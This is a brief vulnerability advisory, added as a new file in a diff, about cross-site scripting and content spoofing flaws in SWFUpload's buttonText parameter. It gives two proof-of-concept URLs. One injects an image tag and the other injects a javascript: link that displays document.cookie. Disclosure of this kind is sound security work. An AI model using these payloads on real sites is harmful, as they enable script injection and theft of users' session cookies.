@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/58417/info
+
+SWFUpload is prone to multiple cross-site scripting and content spoofing vulnerabilities because it fails to sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+Content spoofing:
+
+http://www.example.com/swfupload.swf?buttonText=test%3Cimg%20src=%27http://demo.swfupload.org/v220/images/logo.gif%27%3E
+
+Cross-site scripting:
+
+http://www.example.com/swfupload.swf?buttonText=%3Ca%20href=%27javascript:alert(document.cookie)%27%3EClick%20me%3C/a%3E 
